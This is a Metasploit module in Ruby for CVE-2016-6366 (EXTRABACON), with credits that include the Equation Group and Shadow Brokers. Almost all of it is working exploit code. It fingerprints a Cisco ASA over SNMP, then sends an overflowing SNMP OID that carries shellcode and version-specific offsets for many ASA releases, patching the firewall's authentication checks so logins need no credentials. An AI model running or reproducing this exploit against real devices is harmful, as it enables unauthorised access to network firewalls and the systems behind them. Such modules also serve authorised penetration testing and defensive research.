##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco

  def initialize
    super(
      'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
      'Description' => %q{
          This module patches the authentication functions of a Cisco ASA
          to allow uncredentialed logins. Uses improved shellcode for payload.
        },
      'Author'      =>
        [
          'Sean Dillon <sean.dillon@risksense.com>',
          'Zachary Harding <zachary.harding@risksense.com>',
          'Nate Caroe <nate.caroe@risksense.com>',
          'Dylan Davis <dylan.davis@risksense.com>',
          'William Webb <william_webb[at]rapid7.com>', # initial module and ASA hacking notes
          'Jeff Jarmoc <jjarmoc>', # minor improvements
          'Equation Group',
          'Shadow Brokers'
        ],
      'References' =>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
          [ 'URL', 'https://github.com/RiskSense-Ops/CVE-2016-6366'],
        ],
      'License'     => MSF_LICENSE,
      'Actions'   =>
        [
          ['PASS_DISABLE', {'Description' => 'Disable password authentication.'} ],
          ['PASS_ENABLE', {'Description' => 'Enable password authentication.'} ]
        ],
      'DefaultAction' => 'PASS_DISABLE'
    )

    @offsets = version_offsets()

    register_options([
      OptEnum.new('ASAVER', [ false, 'Target ASA version (default autodetect)', 'auto', ['auto']+@offsets.keys]),
    ])

    deregister_options("VERSION")
    datastore['VERSION'] = '2c' # SNMP v. 2c required it seems
  end

  def version_offsets()
    # Payload offsets for supported ASA versions.
    #     See https://github.com/RiskSense-Ops/CVE-2016-6366
    return {
      "9.2(4)13" => ["197.207.10.8", "70.97.40.9", "72", "0.16.185.9", "240.30.185.9", "85.49.192.137", "0.80.8.8", "240.95.8.8", "85.137.229.87"],
      "9.2(4)" => ["101.190.10.8", "54.209.39.9", "72", "0.48.184.9", "192.52.184.9", "85.49.192.137", "0.80.8.8", "0.91.8.8", "85.137.229.87"],
      "9.2(3)" => ["29.112.29.8",      # jmp_esp_offset, 0
                   "134.115.39.9",     # saferet_offset, 1
                   "72",               # fix_ebp,        2
                   "0.128.183.9",      # pmcheck_bounds, 3
                   "16.128.183.9",     # pmcheck_offset, 4
                   "85.49.192.137",    # pmcheck_code,   5
                   "0.80.8.8",         # admauth_bounds, 6
                   "64.90.8.8",        # admauth_offset, 7
                   "85.137.229.87"],   # admauth_code,   8
      "9.2(2)8" => ["21.187.10.8", "54.245.39.9", "72", "0.240.183.9", "16.252.183.9", "85.49.192.137", "0.80.8.8", "64.90.8.8", "85.137.229.87"],
      "9.2(1)" => ["197.180.10.8", "54.118.39.9", "72", "0.240.182.9", "16.252.182.9", "85.49.192.137", "0.80.8.8", "176.84.8.8", "85.137.229.87"],
      "9.1(1)4" => ["173.250.27.8", "134.177.3.9", "72", "0.112.127.9", "176.119.127.9", "85.49.192.137", "0.48.8.8", "96.49.8.8", "85.137.229.87"],
      "9.0(1)" => ["221.227.27.8", "134.13.3.9", "72", "0.176.126.9", "112.182.126.9", "85.49.192.137", "0.32.8.8", "240.45.8.8", "85.137.229.87"],
      "8.4(7)" => ["109.22.18.8", "70.254.226.8", "72", "0.144.87.9", "80.156.87.9", "85.49.192.137", "0.32.8.8", "0.34.8.8", "85.137.229.87"],
      "8.4(6)5" => ["125.63.32.8", "166.11.228.8", "72", "0.176.88.9", "96.186.88.9", "85.49.192.137", "0.32.8.8", "240.33.8.8", "85.137.229.87"],
      "8.4(4)9" => ["173.23.5.8", "166.113.226.8", "72", "0.144.86.9", "224.154.86.9", "85.49.192.137", "0.16.8.8", "160.27.8.8", "85.137.229.87"],
      "8.4(4)5" => ["202.250.13.8", "246.48.226.8", "72", "0.64.86.9", "16.69.86.9", "85.49.192.137", "0.16.8.8", "160.27.8.8", "85.137.229.87"],
      "8.4(4)3" => ["164.119.8.8", "102.0.226.8", "72", "0.240.85.9", "96.252.85.9", "85.49.192.137", "0.16.8.8", "160.27.8.8", "85.137.229.87"],
      "8.4(4)1" => ["253.74.114.8", "150.236.225.8", "72", "0.192.85.9", "176.202.85.9", "85.49.192.137", "0.16.8.8", "176.27.8.8", "85.137.229.87"],
      "8.4(4)" => ["111.198.161.9", "181.105.226.8", "72", "0.192.85.9", "240.201.85.9", "85.49.192.137", "0.16.8.8", "176.27.8.8", "85.137.229.87"],
      "8.4(3)" => ["13.178.7.8", "150.219.224.8", "72", "0.192.84.9", "208.207.84.9", "85.49.192.137", "0.16.8.8", "208.23.8.8", "85.137.229.87"],
      "8.4(2)" => ["25.71.20.9", "230.222.223.8", "72", "0.128.83.9", "240.143.83.9", "85.49.192.137", "0.16.8.8", "224.19.8.8", "85.137.229.87"],
      "8.4(1)" => ["173.58.17.9", "6.12.219.8", "72", "0.240.72.9", "240.252.72.9", "85.49.192.137", "0.48.8.8", "144.56.8.8", "85.137.229.87"],
      "8.3(2)40" => ["169.151.13.8", "124.48.196.8", "88", "0.128.59.9", "48.137.59.9", "85.49.192.137", "0.224.6.8", "32.228.6.8", "85.137.229.87"],
      "8.3(2)39" => ["143.212.14.8", "124.48.196.8", "88", "0.128.59.9", "176.136.59.9", "85.49.192.137", "0.224.6.8", "32.228.6.8", "85.137.229.87"],
      "8.3(2)" => ["220.203.69.9", "252.36.195.8", "88", "0.80.54.9", "144.84.54.9", "85.49.192.137", "0.208.6.8", "16.222.6.8", "85.137.229.87"],
      #"8.3(2)-npe" => ["125.116.12.8", "76.34.195.8", "88", "0.80.54.9", "224.81.54.9", "85.49.192.137", "0.208.6.8", "16.222.6.8", "85.137.229.87"],
      "8.3(1)" => ["111.187.14.8", "140.140.194.8", "88", "0.112.53.9", "240.119.53.9", "85.49.192.137", "0.208.6.8", "48.221.6.8", "85.137.229.87"],
      "8.2(5)41" => ["77.90.18.8", "188.9.187.8", "88", "0.160.50.9", "16.168.50.9", "85.49.192.137", "0.240.6.8", "16.243.6.8", "85.137.229.87"],
      "8.2(5)33" => ["157.218.29.8", "236.190.186.8", "88", "0.80.50.9", "96.92.50.9", "85.49.192.137", "0.240.6.8", "192.242.6.8", "85.137.229.87"],
      "8.2(5)" => ["253.13.54.9", "156.229.185.8", "88", "0.16.48.9", "96.28.48.9", "85.49.192.137", "0.240.6.8", "64.242.6.8", "85.137.229.87"],
      "8.2(4)" => ["93.172.49.9", "236.91.185.8", "88", "0.176.43.9", "96.187.43.9", "85.49.192.137", "0.240.6.8", "16.242.6.8", "85.137.229.87"],
      "8.2(3)" => ["45.0.7.8", "252.42.185.8", "88", "0.96.43.9", "128.111.43.9", "85.49.192.137", "0.240.6.8", "144.241.6.8", "85.137.229.87"],
      "8.2(2)" => ["150.54.28.9", "124.0.184.8", "88", "0.224.41.9", "32.227.41.9", "85.49.192.137", "0.208.6.8", "64.221.6.8", "85.137.229.87"],
      "8.2(1)" => ["147.242.43.9", "108.154.181.8", "88", "0.0.36.9", "240.14.36.9", "85.49.192.137", "0.208.6.8", "16.215.6.8", "85.137.229.87"],
      "8.0(5)" => ["253.116.31.9", "204.64.171.8", "88", "0.32.24.9", "64.32.24.9", "85.49.192.137", "0.96.6.8", "128.107.6.8", "85.137.229.87"],
      "8.0(4)32" => ["157.6.31.9", "44.20.171.8", "88", "0.176.23.9", "0.176.23.9", "85.49.192.137", "0.96.6.8", "48.105.6.8", "85.137.229.87"],
      "8.0(4)" => ["109.188.26.9", "140.100.168.8", "88", "0.96.19.9", "128.101.19.9", "85.49.192.137", "0.96.6.8", "176.104.6.8", "85.137.229.87"],
      "8.0(3)6" => ["191.143.24.9", "28.158.161.8", "88", "0.0.11.9", "224.1.11.9", "85.49.192.137", "0.96.6.8", "112.101.6.8", "85.137.229.87"],
      "8.0(3)" => ["141.123.131.9", "156.138.160.8", "88", "0.128.9.9", "112.130.9.9", "85.49.192.137", "0.96.6.8", "176.96.6.8", "85.137.229.87"],
      "8.0(2)" => ["155.222.211.8", "44.103.159.8", "88", "0.224.6.9", "32.237.6.9", "85.49.192.137", "0.80.6.8", "48.90.6.8", "85.137.229.87"]
    }
  end

  def check
    begin
      vers_string = get_asa_version()
    rescue ::Exception => e
      print_error("Error: Unable to retrieve version information")
      return Exploit::CheckCode::Unknown
    end

    if @offsets[vers_string]
      print_good("Payload for Cisco ASA version #{vers_string} available!")
      return Exploit::CheckCode::Appears
    end

    print_warning("Received Cisco ASA version #{vers_string}, but no payload available")
    return Exploit::CheckCode::Detected
  end

  def build_payload(vers_string, mode)
    # adds offsets to the improved shellcode
    # https://github.com/RiskSense-Ops/CVE-2016-6366/blob/master/shellcode.nasm

    if mode == 'PASS_DISABLE'
      always_return_true = "49.192.64.195"
      pmcheck_bytes = always_return_true
      admauth_bytes = always_return_true
    else  # PASS_ENABLE
      pmcheck_bytes = @offsets[vers_string][5]
      admauth_bytes = @offsets[vers_string][8]
    end

    preamble_snmp = ""
    preamble_snmp << "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
    preamble_snmp << @offsets[vers_string][3]
    preamble_snmp << ".205.128.88.187."
    preamble_snmp << @offsets[vers_string][6]
    preamble_snmp << ".205.128.199.5."
    preamble_snmp << @offsets[vers_string][4]
    preamble_snmp << "."
    preamble_snmp << pmcheck_bytes
    preamble_snmp << ".199.5."
    preamble_snmp << @offsets[vers_string][7]
    preamble_snmp << "."
    preamble_snmp << admauth_bytes
    preamble_snmp << ".97.104."
    preamble_snmp << @offsets[vers_string][1]
    preamble_snmp << ".128.195.16.191.11.15.15.15.137.229.131.197."
    preamble_snmp << @offsets[vers_string][2]
    preamble_snmp << ".195"

    preamble_len = preamble_snmp.split('.').length
    preamble_snmp << ".144" * (82 - preamble_len)

    # cufwUrlfServerStatus
    head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5"
    head << ".9.95"

    finder_snmp = "139.124.36.20.139.7.255.224.144"

    overflow = [head, preamble_snmp, @offsets[vers_string][0], finder_snmp].join(".")
    return overflow
  end

  def run()
    begin
      session = rand(255) + 1

      vers_string = get_asa_version()

      print_status("Building #{action.name} payload for version #{vers_string}...")
      overflow = build_payload(vers_string, action.name)
      payload = SNMP::ObjectId.new(overflow)

      print_status("Sending SNMP payload...")
      response = snmp.get_bulk(0, 1, [SNMP::VarBind.new(payload)])

      if response.varbind_list
        print_good("Clean return detected!")
        if action.name == 'PASS_DISABLE'
          print_warning("Don't forget to run PASS_ENABLE after logging in!")
          print_warning("  set ACTION PASS_ENABLE")
        end
      end

    rescue ::Rex::ConnectionError
      print_error("Connection Error: Is the target up?")
    rescue ::SNMP::RequestTimeout
      print_error("SNMP Error: Request Timeout, Cisco ASA may have crashed :/")
    rescue ::SNMP::UnsupportedVersion
      print_error("SNMP Error: Version 2c is not supported by target.")
    rescue ::NoMethodError
      print_error("Error: No payload available for version #{vers_string}")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end

  def get_asa_version()
    return datastore['ASAVER'] unless (datastore['ASAVER'] == 'auto')
    vprint_status("Fingerprinting via SNMP...")

    asa_version_oid = '1.3.6.1.2.1.47.1.1.1.1.10.1'
    mib2_sysdescr_oid = '1.3.6.1.2.1.1.1.0'

    snmp = connect_snmp
    ver = snmp.get_value(asa_version_oid).to_s
    vprint_status("OID #{asa_version_oid} yields #{ver}")

    if (ver == "noSuchInstance")
      # asa_version_snmp OID isn't available on some models, fallback to MIB2 SysDescr
      ver = snmp.get_value(mib2_sysdescr_oid).rpartition(' ').last
      vprint_status("OID #{mib2_sysdescr_oid} yields #{ver}")
    end

    ver
  end
end
